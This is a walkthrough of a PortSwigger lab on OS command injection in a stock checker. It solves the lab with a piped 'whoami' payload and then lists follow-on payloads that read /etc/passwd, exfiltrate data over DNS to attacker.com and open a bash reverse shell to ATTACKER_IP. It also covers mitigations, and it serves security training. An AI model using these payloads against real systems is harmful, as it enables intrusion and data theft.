# PortSwigger — OS Command Injection, Simple Case

`Web Security Academy` • `OS Command Injection` • `Apprentice`

## TL;DR

The product stock checker passes user-supplied `productId` and `storeId` parameters directly into a shell command without sanitisation. By injecting a pipe operator (`|`) followed by an arbitrary command into the `storeId` parameter, the server executes the injected command and returns its raw output in the HTTP response. The lab is solved by submitting `1|whoami` as the `storeId`, which reveals the current OS user (`peter-iZqkdL`).

**Lab URL:** `https://YOUR-LAB-ID.web-security-academy.net/`

---

## Challenge Description

> This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response. To solve the lab, execute the `whoami` command to determine the name of the current user.

**Context:**
- Difficulty: **Apprentice**
- Category: **OS Command Injection**
- Goal: Execute `whoami` and retrieve the current OS username

---

## Background — How OS Command Injection Works

Many applications delegate certain operations to the underlying operating system by constructing and executing shell commands dynamically. When user-supplied input is concatenated directly into these commands without sanitisation, an attacker can append additional shell operators to alter the intended command flow.

Common injection operators include:

| Operator | Behaviour |
|---|---|
| `\|` | Pipes stdout of left command into right command |
| `&` | Runs both commands (left in background) |
| `&&` | Runs right command only if left succeeds |
| `;` | Runs both commands sequentially |
| `` `cmd` `` | Command substitution — executes `cmd` inline |
| `$(cmd)` | Command substitution — modern syntax |

The server in this lab constructs a command resembling:

```bash
stock_check.sh <productId> <storeId>
```

Because neither parameter is validated, injecting `1|whoami` as `storeId` transforms the command into:

```bash
stock_check.sh 1 1|whoami
```

The shell executes both sides of the pipe and the output of `whoami` is returned in the HTTP response.

---

## Recon

### Step 1 — Locate the stock checker feature

Navigate to any product page. At the bottom, a **"Check stock"** form allows you to query stock for a given store. Submitting the form sends a POST request to `/product/stock`.

### Step 2 — Inspect the raw request

Intercept the request with Burp Suite or observe via DevTools. The POST body contains:

```
productId=1&storeId=1
```

Both parameters are sent as plain integers with no additional encoding or token protection.

### Step 3 — Confirm the response is raw command output

A normal request returns a plain integer (the stock count):

```
382
```

The application returns the **raw stdout** of the shell command — which means any injected command's output will also be returned verbatim.

### Step 4 — Test for injection

Inject a basic operator into `storeId`:

```
productId=1&storeId=1|whoami
```

The response contains:

```
peter-iZqkdL
```

The injected command executed successfully. The `storeId` parameter is vulnerable to OS command injection.

---

## Understanding the Vulnerability

### Source → Sink data flow

```
POST /product/stock
    └── storeId parameter (user-controlled)
            └── concatenated into shell command without sanitisation
                    └── executed by the OS via exec() / shell_exec()
                            └── raw stdout returned in HTTP response
```

### Why the pipe operator works

The shell interprets `|` as a **pipe** — it redirects the stdout of the left-hand process into the stdin of the right-hand process. Since `whoami` reads nothing from stdin and simply prints the current user, it executes independently and its output is captured by the application and returned as the response body.

### Character analysis

| Character | Filtered? | Impact |
|---|---|---|
| `\|` | ❌ No | Pipe — chains a second command |
| `&` | ❌ No | Background execution of a second command |
| `;` | ❌ No | Sequential command execution |
| `$()` | ❌ No | Command substitution |

No input validation or sanitisation is applied to either parameter.

---

## Exploitation

### The Payload

```
productId=1&storeId=1|whoami
```

### Step-by-step exploitation

**Option 1 — curl (command line)**

```bash
curl -X POST "https://YOUR-LAB-ID.web-security-academy.net/product/stock" \
  -d "productId=1&storeId=1|whoami"
```

**Option 2 — Burp Suite Repeater**

1. Enable intercept in Burp Suite
2. Click **"Check stock"** on any product page
3. Forward the intercepted request to **Repeater** (`Ctrl+R`)
4. Modify the request body:
   ```
   productId=1&storeId=1|whoami
   ```
5. Click **Send** — the response panel displays the current username

**Option 3 — Browser DevTools console**

```javascript
fetch("/product/stock", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "productId=1&storeId=1|whoami"
}).then(r => r.text()).then(console.log)
```

### Result

```
peter-iZqkdL
```

**LAB SOLVED ✅**

### Execution Flow

```
Attacker submits: productId=1&storeId=1|whoami
        ↓
Server receives parameters — no validation applied
        ↓
Shell command constructed:
  stock_check.sh 1 1|whoami
        ↓
OS executes the pipe chain:
  stock_check.sh 1 1 → stdout piped to whoami
        ↓
whoami returns the current process owner: peter-iZqkdL
        ↓
Application returns raw stdout in HTTP response
        ↓
LAB SOLVED ✅
```

---

## Alternative Payloads

Once the injection point is confirmed, the same technique can be used to run arbitrary commands:

```bash
# List files in the current directory
productId=1&storeId=1|ls -la

# Read a sensitive file
productId=1&storeId=1|cat /etc/passwd

# Check the server's network configuration
productId=1&storeId=1|ifconfig

# Exfiltrate data via DNS (out-of-band)
productId=1&storeId=1|nslookup $(whoami).attacker.com

# Reverse shell
productId=1&storeId=1|bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## OS Command Injection vs Other Injection Types

| Property | OS Command Injection | SQL Injection | SSTI |
|---|---|---|---|
| Injection target | Shell / OS | Database engine | Template engine |
| Execution context | OS process | DB query | Server-side template |
| Impact | Full RCE | Data exfiltration / DB RCE | RCE / data leak |
| Common sink | `exec()`, `shell_exec()`, `popen()` | `query()`, `execute()` | `render()`, `evaluate()` |
| Blocked by parameterisation | ✅ Partially | ✅ Yes | ❌ No |
| Blocked by HTML encoding | ❌ No | ❌ No | ❌ No |

OS Command Injection is among the most critical vulnerability classes because it grants direct access to the underlying system — file system, network stack, environment variables, and running processes — without any further exploitation steps.

---

## Key Takeaways

- **Never concatenate user input into shell commands** — use language-native APIs that do not invoke a shell (e.g. `execFile()` in Node.js, `subprocess` with a list in Python)
- **Allowlist validation is the correct mitigation** — if the parameter must be a store ID, validate that it matches `/^\d+$/` before using it; reject anything else
- **Raw stdout returned in the response makes blind injection unnecessary** — in this lab the output is directly visible; many real-world cases require out-of-band or time-based techniques to confirm execution
- **The pipe operator is not the only vector** — `;`, `&`, `&&`, and command substitution (`$()`) all achieve the same result depending on the OS and shell
- **The fix:** replace `shell_exec(command + userInput)` with a parameterised system call that never invokes a shell interpreter:
  ```python
  # Vulnerable
  os.system(f"stock_check.sh {product_id} {store_id}")

  # Safe
  subprocess.run(["stock_check.sh", product_id, store_id], capture_output=True)
  ```

---

## References

- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PortSwigger — Command Injection Cheat Sheet](https://portswigger.net/web-security/os-command-injection/cheat-sheet)
- [OWASP — OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP — Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- [MDN — subprocess (Python docs)](https://docs.python.org/3/library/subprocess.html)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)